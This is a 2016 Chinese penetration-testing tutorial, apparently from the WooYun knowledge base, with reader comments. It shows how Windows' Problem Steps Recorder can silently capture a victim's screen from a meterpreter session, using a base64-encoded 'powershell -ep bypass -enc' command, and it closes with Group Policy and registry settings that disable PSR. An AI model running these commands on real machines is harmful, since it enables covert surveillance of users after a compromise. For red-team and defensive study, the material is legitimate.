<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">渗透技巧——如何巧妙利用PSR监控Windows桌面</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/03/29 10:21" ui-time="" datetime="2016/03/29 10:21" class="published ng-binding ng-isolate-scope">2016/03/29 10:21</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>在渗透测试的过程中，如果需要获取主机的更多信息，相比于键盘记录，记录系统屏幕的操作往往更加直接有效。<br>也许每个人都有自己独特的实现方式，但是如果能够利用Windows系统自带的程序实现，个人认为绝对是最优先考虑的方案。<br>下面就介绍一下如何利用Windows系统自带的功能实现监控屏幕操作。</p><p><img alt="Alt text" img-src="1da445f743ee6c87211f49af8467fcc51d7b7097.jpg"></p><h1>0x01 简介</h1><hr><p><strong>PSR</strong>（Problem Steps Recorder），直译为问题步骤记录器，在Windows 早期的系统中，采用<strong>WER</strong>（Windows Error Reporting）来收集系统的错误报告，但这些报告往往包含的信息太少以致于无法解决实际问题。</p><p>为此，微软从Windows 7系统开始，增加了PSR来解决这个问题，PSR能够记录用户在遇到崩溃时执行的所有操作，以便测试人员和开发人员能够重现环境对其分析和调试。</p><p>当PSR运行时，将会自动记录屏幕的操作，每次操作都会自动保存成一张图片，最终生成一份zip格式的报告。</p><p><strong>注：</strong><br>百度百科对psr的名称描述有误，准确的应为Problem Steps Recorder（该问题已提交）</p><p>如图 <img alt="Alt text" img-src="38d444b3a2837418f1652683822f2cc500e438f3.jpg"></p><p>链接为：<br><a href="http://baike.baidu.com/link?url=BCQtF6gpxNGulRPj-vACw_NGwZvHPcrfvn4vmx6u_JFI_OcuPJIFzY3GYE-mu91DZcB-RLiQ6pGXTki1Fc0Y6K">http://baike.baidu.com/link?url=BCQtF6gpxNGulRPj-vACw&#95;NGwZvHPcrfvn4vmx6u&#95;JFI_OcuPJIFzY3GYE-mu91DZcB-RLiQ6pGXTki1Fc0Y6K</a></p><h1>0x02 使用方法</h1><hr><h3>1、启动psr.exe，点击开始录制</h3><p>可使用快捷键win+R直接输入psr来启动<br>下图为psr的操作面板，点击开始记录即可记录当前的屏幕操作</p><p><img alt="Alt text" img-src="f16ff80fb532ec9dc812782d189ddd173914debf.jpg"></p><p>点击后会提示权限的问题，如果需要记录管理员权限的程序，那么需要以管理员权限来运行psr，如图</p><p><img alt="Alt text" img-src="b780a85358a1a54d1917d50285130f8f2f1b5149.jpg"></p><h3>2、进行任意操作</h3><p>当运行psr开始录制后，鼠标点击时会增加特效</p><p>如图 <img alt="Alt text" img-src="bc2894470ea0bd80cff38ee259dca071cc79af1a.jpg"></p><h3>3、停止记录，保存报告</h3><p>如图 <img alt="Alt text" img-src="aeb39001b0d39f85209d2f3f2bbab10305b5c22a.jpg"></p><h3>4、查看报告</h3><p>报告会对每次操作截图，并记录鼠标的操作</p><p>比如鼠标的单击操作，从截图注释可以看到当前的鼠标做了哪些操作 <img alt="Alt text" img-src="08eeec6ef2124bebe966dedbaa6a4f258dd14325.jpg"></p><p>而且，在报告后半部分会详细记录相关细节，里面的内容也很是有趣： <img alt="Alt text" img-src="a0536de0deef19d7d0043e363980dfec0a664d75.jpg"></p><h1>0x03 进阶方法</h1><hr><p>psr在记录屏幕的操作中会启动UI界面，并且对鼠标点击操作增加特效，这显然无法满足渗透测试的要求。</p><p>但好在psr提供了命令行参数用作后台记录</p><p>命令行参数如下：</p><pre><code>#!bash
psr.exe [/start |/stop][/output &lt;fullfilepath&gt;] [/sc (0|1)] [/maxsc &lt;value&gt;]
[/sketch (0|1)] [/slides (0|1)] [/gui (0|1)]
[/arcetl (0|1)] [/arcxml (0|1)] [/arcmht (0|1)]
[/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]

/start Start Recording. (Outputpath flag SHOULD be specified)
/stop Stop Recording.
/sc Capture screenshots for recorded steps.
/maxsc Maximum number of recent screen captures.
/maxlogsize Maximum log file size (in MB) before wrapping occurs.
/gui Display control GUI.
/arcetl Include raw ETW file in archive output.
/arcxml Include MHT file in archive output.
/recordpid Record all actions associated with given PID.
/sketch Sketch UI if no screenshot was saved.
/slides Create slide show HTML pages.
/output Store output of record session in given path.
/stopevent Event to signal after output files are generated.
</code></pre><p>结合实际，可使用以下命令：</p><ol><li><p><code>psr.exe /start /gui 0 /output C:\test\capture.zip</code></p><p>后台启动psr并开始录制，文件保存为C:\test\capture.zip</p></li><li><p><code>psr.exe /stop</code></p><p>结束录制并退出psr，自动保存报告文件</p></li></ol><h1>0x04 实际测试</h1><hr><p><strong>测试环境：</strong></p><pre><code>Server：
OS：Kali linux
IP：192.168.174.133

Client：
OS:Win7 x86
IP:192.168.174.128

Kali已获得meterpreter权限
</code></pre><p>如图 <img alt="Alt text" img-src="1de30e3a29f712f8a32b78de273151663d63d824.jpg"></p><p><strong>测试功能：</strong></p><ol><li>自动启动录制</li><li>录制指定时间后自动退出</li><li>自动保存报告文件</li></ol><p>可使用Powershell对上述功能做简单实现：</p><p><strong>1、</strong>启动自动录制，设置为无界面模式，并指定输出路径：</p><pre><code>#!bash
psr.exe /start /gui 0 /output C:\test\capture.zip;
</code></pre><p><strong>2、</strong>等待10s，即录制时间为10s：</p><pre><code>#!bash
Start-Sleep -s 10;
</code></pre><p><strong>3、</strong>结束录制，自动退出：</p><pre><code>#!bash
psr.exe /stop;
</code></pre><p>可将以上代码保存为<code>C:\test\1.txt</code>，然后对其作base64加密</p><p>在Powershell环境下执行如下代码来对功能代码进行base64加密：</p><pre><code>#!powershell
$string=Get-Content "C:\test\1.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded
</code></pre><p><img alt="Alt text" img-src="018fbcfa73334af91e809fff581a3326ed9c8942.jpg"></p><p>如图，从输出得到加密的Powershell命令为：</p><pre><code>#!bash
cABzAHIALgBlAHgAZQAgAC8AcwB0AGEAcgB0ACAALwBnAHUAaQAgADAAIAAvAG8AdQB0AHAAdQB0ACAAQwA6AFwAdABlAHMAdABcAGMAYQBwAHQAdQByAGUALgB6AGkAcAA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADsAIABwAHMAcgAuAGUAeABlACAALwBzAHQAbwBwADsA
</code></pre><p>然后就可以在meterpreter的shell下直接执行Powershell命令：</p><pre><code>#!bash
powershell -ep bypass -enc cABzAHIALgBlAHgAZQAgAC8AcwB0AGEAcgB0ACAALwBnAHUAaQAgADAAIAAvAG8AdQB0AHAAdQB0ACAAQwA6AFwAdABlAHMAdABcAGMAYQBwAHQAdQByAGUALgB6AGkAcAA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADsAIABwAHMAcgAuAGUAeABlACAALwBzAHQAbwBwADsA
</code></pre><p><img alt="Alt text" img-src="666887c8d907395736f274b2b90dacf0608d527e.jpg"></p><p>代码执行后，等待10s产成报告文件capture.zip，测试成功</p><h1>0x05 防御</h1><hr><p>可采用以下两种方法关闭psr：</p><h3>1、使用组策略</h3><p><strong>中文系统：</strong></p><p>gpedit.msc-管理模板-Windows组件-应用程序兼容性</p><p>启用关闭问题步骤记录器</p><p>如图 <img alt="Alt text" img-src="0b55365ddfaf67bf4f45e11fe2af5755e52df435.jpg"></p><p><strong>英文系统：</strong></p><p>gpedit.msc-Computer Configuration-Administrative Templates-Windows Components-Application Compatibility</p><p>启用Turn off Problem Steps Recorder</p><p>如图 <img alt="Alt text" img-src="e7bfabd84462e911ce7eb894518205919116ef38.jpg"></p><h3>2、修改注册表</h3><pre><code>#!bash
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\AppCompat]
</code></pre><p>新建<code>"DisableUAR"=dword:00000001</code></p><p>如图 <img alt="Alt text" img-src="5b1e9ddcdf797ede7bbb42e158d3b61820508d92.jpg"></p><p><strong>注：</strong><br>dword=1对应组策略中的已启用<br>dword=0对应组策略中的已禁用<br>删除"DisableUAR"对应组策略中的未配置</p><h1>0x06 小结</h1><hr><p>利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，一定会用上它。</p><h1>0x07 参考资料</h1><hr><ul><li><a href="https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/">https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/</a></li><li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd371782(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/dd371782(v=vs.85).aspx</a></li><li><a href="https://blogs.msdn.microsoft.com/cjacks/2009/02/25/deciphering-the-command-line-configuration-of-the-windows-7-problem-steps-recorder/">https://blogs.msdn.microsoft.com/cjacks/2009/02/25/deciphering-the-command-line-configuration-of-the-windows-7-problem-steps-recorder/</a></li><li><a href="https://technet.microsoft.com/en-us/magazine/dd464813.aspx">https://technet.microsoft.com/en-us/magazine/dd464813.aspx</a></li><li><a href="http://blogs.msdn.com/b/wer/archive/2009/03/30/problem-steps-recorder-psr-exe-windows-error-reporting-another-tool-to-help-find-solutions-to-software-defects.aspx">http://blogs.msdn.com/b/wer/archive/2009/03/30/problem-steps-recorder-psr-exe-windows-error-reporting-another-tool-to-help-find-solutions-to-software-defects.aspx</a></li><li><a href="http://blogs.technet.com/b/mspfe/archive/2013/03/22/uncovering-a-hidden-gem-psr-exe.aspx">http://blogs.technet.com/b/mspfe/archive/2013/03/22/uncovering-a-hidden-gem-psr-exe.aspx</a></li><li><a href="http://www.sevenforums.com/tutorials/139779-problem-steps-recorder-enable-disable.html">http://www.sevenforums.com/tutorials/139779-problem-steps-recorder-enable-disable.html</a></li></ul><p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">111</span> <span class="reply-time">2016-05-19 09:46:06</span></div><p></p><p>学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-16 11:15:48</span></div><p></p><p>@懒懒滴1994 哪里有转义了?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">懒懒滴1994</span> <span class="reply-time">2016-05-15 21:08:10</span></div><p></p><p>有点怀疑是翻译过来的?作者实践过么？cmd下有转义= =</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">无敌情痴</span> <span class="reply-time">2016-04-09 22:24:07</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1cg</span> <span class="reply-time">2016-03-30 21:02:55</span></div><p></p><p>@浮生 http://zone.wooyun.org/content/24486</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮生</span> <span class="reply-time">2016-03-30 15:11:37</span></div><p></p><p>用过一个powershell,直接在本机打开一个端口，你远程用火狐就可以查看到对方桌面，用的截图功能</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">继续沉默</span> <span class="reply-time">2016-03-29 13:54:25</span></div><p></p><p>好像不会自己创建目录，需要指定一个已经存在的目录</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-03-29 11:53:45</span></div><p></p><p>@test psr可以结合键盘记录一起使用啊，哪部分内容是不会记录的呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2016-03-29 11:42:15</span></div><p></p><p>并没有键盘记录器好用，psr不会记录下你通过键盘输入的信息，像cmd命令什么的，只能通过截图来查看，而且，并不是你的每一个步骤都会被记录下来，只会记录下来一部分。</p><p></p></div></div></div></div></div></main>